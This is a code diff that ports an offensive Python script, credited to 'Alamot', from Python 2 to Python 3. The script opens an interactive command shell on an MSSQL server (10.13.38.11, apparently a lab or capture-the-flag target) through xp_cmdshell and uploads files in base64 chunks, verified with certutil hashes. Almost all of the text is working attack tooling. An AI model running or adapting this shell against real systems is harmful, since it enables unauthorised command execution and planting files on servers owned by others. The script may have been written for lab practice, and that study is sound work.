@@ -1,6 +1,5 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python
 from __future__ import print_function
-
 # Author: Alamot
 # Use pymssql >= 1.0.3 (otherwise it doesn't work correctly)
 # To upload a file type: UPLOAD local_path remote_path
@@ -12,6 +11,10 @@ import shlex
 import sys
 import tqdm
 import hashlib
+from io import open
+try: input = raw_input
+except NameError: pass
+
 
 MSSQL_SERVER="10.13.38.11"
 MSSQL_USERNAME = "Domain\\sa_user"
@@ -26,11 +29,14 @@ def process_result(mssql):
     cwd = ""
     rows = list(mssql)
     for row in rows[:-3]:
-        columns = row.keys()
-        print(row[columns[-1]])
+        columns = list(row)
+        if row[columns[-1]]:
+            print(row[columns[-1]])
+        else:
+            print()
     if len(rows) >= 3:
-        (username, computername) = rows[-3][rows[-3].keys()[-1]].split('|')
-        cwd = rows[-2][rows[-3].keys()[-1]]
+        (username, computername) = rows[-3][list(rows[-3])[-1]].split('|')
+        cwd = rows[-2][list(rows[-3])[-1]]
     return (username.rstrip(), computername.rstrip(), cwd.rstrip())
 
 
@@ -42,7 +48,7 @@ def upload(mssql, stored_cwd, local_path, remote_path):
     with open(local_path, 'rb') as f:
         data = f.read()
         md5sum = hashlib.md5(data).hexdigest()
-        b64enc_data = "".join(base64.encodestring(data).split())
+        b64enc_data = b"".join(base64.encodestring(data).split()).decode()
         
     print("Data length (b64-encoded): "+str(len(b64enc_data)/1024)+"KB")
     for i in tqdm.tqdm(range(0, len(b64enc_data), BUFFER_SIZE), unit_scale=BUFFER_SIZE/1024, unit="KB"):
@@ -55,7 +61,7 @@ def upload(mssql, stored_cwd, local_path, remote_path):
     process_result(mssql)
     cmd = 'certutil -hashfile "' + remote_path + '" MD5'
     mssql.execute_query("EXEC xp_cmdshell 'cd "+stored_cwd+" & "+cmd+" & echo %username%^|%COMPUTERNAME% & cd'")
-    if md5sum in [row[row.keys()[-1]].strip() for row in mssql if row[row.keys()[-1]]]:
+    if md5sum in [row[list(row)[-1]].strip() for row in mssql if row[list(row)[-1]]]:
         print("MD5 hashes match: " + md5sum)
     else:
         print("ERROR! MD5 hashes do NOT match!")
@@ -76,7 +82,7 @@ def shell():
         stored_cwd = cwd
         
         while True:
-            cmd = raw_input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
+            cmd = input("CMD "+username+"@"+computername+" "+cwd+"> ").rstrip("\n").replace("'", "''")
             if cmd.lower()[0:4] == "exit":
                 mssql.close()
                 return
